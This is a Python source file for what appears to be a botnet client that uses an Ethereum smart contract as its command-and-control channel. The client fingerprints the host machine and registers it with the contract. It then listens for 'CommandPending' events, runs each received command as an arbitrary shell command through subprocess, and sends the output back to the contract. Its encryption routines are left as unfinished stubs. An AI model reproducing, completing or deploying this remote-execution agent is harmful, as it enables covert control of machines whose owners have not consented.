import time, sys, json, signal, shutil, atexit, yaml
from os.path import join as opj
from web3 import Web3, HTTPProvider

import Client.OsInteractions as OsInteractions
from web3.contract import ConciseContract
from Util.SolidityTypeConversionUtil import *
from Util.Process import waitFor, kill_proc
from Util.EtherKeysUtil import *
from Util.EtherTransaction import *
import subprocess as sp

REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
COMMAND_PENDING_EVENT_NAME = 'CommandPending'


l = LogWrapper.getLogger()

class ClientCommands:

	def __init__(self, confFile):
		conf = yaml.safe_load(open(confFile))

		self.contractAddress = conf['contract']['address']
		self.contractAbi = conf['contract']['abi']

		# TODO: check node is up. load node if not ,wait for connection and sync.
		proc = self.runGethNode(conf)
		# connect to local node
		self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))

		self.web3.admin.addPeer(conf['enode'])
		peers = waitFor (lambda : self.web3.admin.peers, emptyResponse=[],pollInterval=0.1, maxRetries=10)
		assert (len(peers) > 0)
		l.info('connected peers:',self.web3.admin.peers)

		self.waitForNodeToSync()

		# load contract
		self.contract = self.loadContract()
		time.sleep(5)
		self.ownerPubKey = self.contract.ownerPubKey()
		#TODO: check contract is up, otherwise go to sleep or die

		self.password = conf['clientWalletPassword']
		self.public, self.private, self.address = loadWallet(conf['clientWallet'], self.password)

		l.info("client wallet:",self.address, "contract:",self.contractAddress)
		importAccountToNode(self.web3, self.address, self.private, self.password)

		self.sessionId=None
		self.gasLimit_ev = conf['gasLimit_ev']


	def waitForNodeToSync(self):
		l.info('waiting for node to sync...')
		while self.web3.eth.syncing or self.web3.eth.blockNumber == 0:
			l.debug('current synced block is:', self.web3.eth.blockNumber if self.web3.eth.blockNumber == 0 else self.web3.eth.syncing['currentBlock'])
			time.sleep(1)
		l.info('chain Sync done!')

	def loadContract(self):
		l.info('loading contract from:', self.contractAddress, self.contractAbi)

		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
		return contract

	def registered(self):
		return self.sessionId != None

	def registerInstance(self):
		if self.registered():
			return True

		try:
			machineId = OsInteractions.fingerprintMachine()
			machineIdEnc = self.encryptMessageForServer(machineId)
			self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': self.gasLimit_ev})

			self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
																self.contractAbi,
																self.contractAddress,
																self.web3,
																topicFilters=[self.web3.sha3(self.address)])

			txs = waitFor(lambda: self.commandFilter.get(True), emptyResponse=[], pollInterval=1, maxRetries=30)
			self.web3.eth.uninstallFilter(self.commandFilter.filter_id)
			for tx in txs:
				sessionId = getLogEventArg(tx, eventABI, 'sessionId')
				self.sessionId = self.decryptMessageFromServer(sessionId)
				l.info('Successful registration! SessionId:', self.sessionId)

		except Exception as e:
			l.error("Error in returned log event:", e)
			self.sessionId = None

		return self.registered()


	def doWork(self, shell_cmd):
		#TODO actually execute stuff...
		s, out = sp.getstatusoutput(shell_cmd)
		ret = { 'status': s,
				'output': out[:32] }
		return json.dumps(ret)

	def sendResults(self, cmdId, workResults):
		l.info("sending results of cmdId",cmdId,"to server. result:", workResults,'...')
		machineId = OsInteractions.fingerprintMachine()
		sessionAndMachineIdHash = toBytes32Hash(self.sessionId + machineId)
		#function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
		self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': self.gasLimit_ev})

	def decryptMessageFromServer(self, msg, encrypt=True):
		# TODO compelete
		# if encrypt:
		# 	alice = pyelliptic.ecc()
		# 	msg = alice.encrypt(msg,self.ownerPubKey)
		return msg

	def encryptMessageForServer(self, msg, decrypt = True):
		# TODO compelete
		# if decrypt:
		# 	bob = pyelliptic.ecc()
		# 	bob.decrypt()
		return msg




	def mainLoop(self):
			sleep = 1
			while not self.registered():
				l.info('trying to register instance')
				l.info('Account Balance: ', str(self.web3.fromWei(self.web3.eth.getBalance(self.address), "ether")))
				success = self.registerInstance()
				if not success:
					time.sleep(sleep)
					sleep *= 2

			if self.registered():
				try:
					l.info('instance is now registered with server. waiting for work...')
					self.commandFilter, eventABI = createLogEventFilter(COMMAND_PENDING_EVENT_NAME,
										 self.contractAbi,
										 self.contractAddress,
										 self.web3,
										 topicFilters = [self.web3.sha3(self.address)])
					# eventABI = filter_by_name(COMMAND_PENDING_EVENT_NAME, self.contractAbi)[0]
					# eventSignature = abi_to_signature(eventABI)
					# eventHash = self.web3.sha3(encode_hex(eventSignature))
					# l.debug('eventSignature:',eventSignature,'eventHash:',eventHash)
					# self.commandFilter = self.web3.eth.filter({'from':self.contractAddress,
					# 					  'topics': [eventHash, self.web3.sha3(self.address)]})
					def onCommandArrival(tx):
						l.debug('new command event:',tx)

						command = getLogEventArg(tx, eventABI,'command')
						cmdId = getLogEventArg(tx, eventABI, 'cmdId')

						commandDec = self.decryptMessageFromServer(command)
						l.info('Decrypted a new command from server. id:',cmdId,'cmd:',commandDec)

						workResults = self.doWork(commandDec)
						l.info('Command',cmdId, 'execution complete:', workResults)

						workResultsEnc = self.encryptMessageForServer(workResults)
						self.sendResults(cmdId, workResultsEnc)

					self.commandFilter.watch(onCommandArrival)
				except Exception as e:
					l.error("Error in event watcher registration:", e)
					if self.commandFilter and self.commandFilter.running:
						self.commandFilter.stopWatching()



	def runGethNode(self, conf):
		gethLockFile = opj(conf['BlockChainData'], 'LOCK.pid')
		if (os.path.isfile(gethLockFile)):
			with open (gethLockFile) as f:
				pid = f.read()
				if (pid):
					try:
						os.kill(int(pid), signal.SIGTERM)
						time.sleep (1)
						l.debug('Old geth was running at PID:',pid,'. Killed.')
					except OSError:
						pass #all good because process wasn't running anymore

		# genesis = ast.literal_eval(conf['genesis'])

		if conf['opMode'] == 'test':
			if not os.path.exists(conf['genesisFile']):
				l.warning('Fresh start! removing blockchain dir ',conf['BlockChainData'])

				shutil.rmtree(conf['BlockChainData'],ignore_errors=True)

				with open(conf['genesisFile'], 'w') as f:
					json.dump(conf['genesis'], f, indent=1)

				l.info('Initializing blockchain...')
				gethExe = conf['geth'] + ('.exe' if os.name == 'nt' else '')
				cmd = [gethExe,'--datadir',conf['BlockChainData'],	'init',	conf['genesisFile']]

				l.debug('Running geth init: ' , ' '.join(cmd))
				with open(opj('logs', 'geth.client.log'), 'a') as f:
					proc = runCommand(cmd, stdout=f)
					proc.communicate()
		elif conf['opMode'] == 'TestNet':
			pass
		elif conf['opMode'] == 'RealNet':
			pass

		l.info('Running geth node...')
		cmd = conf['gethCmd']
		l.debug('Running light geth : ' , ' '.join(cmd))

		proc = runCommand(cmd, stderr=open(opj('logs', 'geth.client.log'), 'a'))

		if proc.returncode:
			std,sterr = proc.communicate()
			raise ValueError(format_error_message(
				"Error trying to run geth node",cmd,proc.returncode,std,sterr,))

		atexit.register(lambda: kill_proc(proc))

		time.sleep(1)

		with open(gethLockFile,'w') as f:
			f.write(str(proc.pid))
		l.info('Geth node running. PID:',str(proc.pid))

		return proc

if __name__ == "__main__":
	l.info ("base dir ",sys.argv[1])

	os.chdir(sys.argv[1])
	confFile = sys.argv[2]

	cc = ClientCommands(confFile)

	cc.mainLoop()
	




